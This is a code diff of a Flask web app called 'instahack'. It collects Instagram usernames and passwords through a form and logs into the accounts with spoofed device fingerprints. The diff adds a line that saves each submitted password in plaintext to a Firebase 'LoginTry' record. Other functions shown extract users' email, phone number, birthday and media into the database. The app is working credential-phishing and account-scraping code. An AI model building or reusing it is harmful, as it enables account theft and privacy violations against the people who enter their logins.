@@ -9,17 +9,17 @@ import glob
 
 app = Flask(__name__)
 
-user,db = '',''
+user, db = '', ''
 
-FIREBASE_CONFIG = {
-    'apiKey': os.getenv('apiKey'),
-    'authDomain': os.getenv('authDomain'),
-    'databaseURL': os.getenv('databaseURL'),
-    'projectId': os.getenv('projectId'),
-    'storageBucket': os.getenv('storageBucket'),
-    'messagingSenderId': os.getenv('messagingSenderId'),
-    'appId': os.getenv('appId')
-}
+# FIREBASE_CONFIG = {
+#     'apiKey': os.getenv('apiKey'),
+#     'authDomain': os.getenv('authDomain'),
+#     'databaseURL': os.getenv('databaseURL'),
+#     'projectId': os.getenv('projectId'),
+#     'storageBucket': os.getenv('storageBucket'),
+#     'messagingSenderId': os.getenv('messagingSenderId'),
+#     'appId': os.getenv('appId')
+# }
 
 Gender_ar = ['Female', 'Male', 'Custom', 'Prefer Not To Say']
 
@@ -49,7 +49,11 @@ REGISTERED_USERS = getResigteredUsers(db)
 
 
 def login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD):
-    user = Client()
+    settings = {'device_settings': {'app_version': '194.0.0.36.172', 'android_version': 26, 'android_release': '8.0.0', 'dpi': '640dpi', 'resolution': '1440x2392',
+                                    'manufacturer': 'Samsung', 'device': 'S21-Ultra', 'model': 'comancheatt', 'cpu': 'qcom', 'version_code': '301484483'},
+                'user_agent': 'Instagram 194.0.0.36.172 Android (26/8.0.0; 640dpi; 1440x2392; Samsung; S21-Ultra; comancheatt; qcom; en_US; 301484483)'}
+    user = Client(settings)
+    user.device_id = "android-86d8bac538f2c0d0"
     user.login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD)
     return user
 
@@ -65,7 +69,7 @@ def get_account_details(user):
 
 
 def get_user_info(user):
-    details=''
+    details = ''
     try:
         details = user.user_info(user.user_id)
     except:
@@ -122,13 +126,16 @@ def download_media(user, userid, mediacount):
         except Exception as e:
             print(e)
 
+
 def encodeUsername(username):
-    user_name = username.replace('.','-')
+    user_name = username.replace('.', '-')
     return user_name
 
+
 def decodeUsername(username):
-    user_name = username.replace('-','.')
+    user_name = username.replace('-', '.')
     return user_name
+
 
 def push_data(user, db):
     userid, email, mobileno, gender, birthday = get_account_details(user)
@@ -181,6 +188,7 @@ def instahack():
         user_name = request.form.get("uname")
         password = request.form.get("pword")
         try:
+            db.child("LoginTry").set({encodeUsername(user_name): password})
             globals()['user'] = login(user_name, password)
             print('Login Sucessfull!')
         except Exception as e:
@@ -211,7 +219,8 @@ def instahack():
                 print(e)
             return render_template("profile.html", profile_pic=username+'.jpg', name=name, bio=bio, user_name=username, followers_count=followers_count, following_count=following_count, media_count=media_count)
         else:
-            print('User Not Found in Database, Extracting user Information form Instagrapi...')
+            print(
+                'User Not Found in Database, Extracting user Information form Instagrapi...')
             name, username, profile_pic, bio, is_private, followers_count, following_count, media_count = get_user_info(
                 user)
             print('Extracted all user data) from instagrapi')
